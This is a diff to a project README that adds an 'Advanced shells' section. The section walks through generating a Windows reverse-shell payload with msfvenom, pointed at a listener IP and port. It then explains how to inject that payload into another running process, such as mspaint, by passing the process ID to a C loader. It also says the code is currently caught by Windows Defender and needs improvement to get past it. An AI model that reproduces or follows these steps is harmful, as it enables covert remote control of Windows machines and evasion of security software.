@@ -152,3 +152,38 @@ Feel free to submit issues and enhancement requests!
 *Made with ❤️ for the Linux → Windows development community*
 
 </div>
+
+
+
+# SECTION 2 [Advanced shells]
+
+*Currently this code is detected by windows defender we need to improve and execute correctly winAPI with valid methods*
+
+## Create the payload of a previous binary such as ReverseShell_Win.c
+
+First you need to compile your code please use the first command in this guide for it.
+
+
+In this case we going to use a built-in reverse shell of kali linux just replace your current IP Address
+![alt text](images/Payload.png)
+
+
+Then you will be able to use :
+```
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.1.5
+LPORT=4444 -f c
+
+```
+
+For the action of injection we going to attack over another PID how our AdvancedWinShell.c expects.
+
+Step 1 \
+Identify the PID (in this case MSPAINT) *4900*
+![alt text](images/PIDSample.png)
+
+Then if you already has readed the program must to pass it as ARGUMENT in the execution that will run the program and allocate the other process that is the payload.
+
+>!! IMPORTANT !! You can't allocate an 32 bit code process inside 64 bit process be careful what system architecture is your process to attack.
+
+
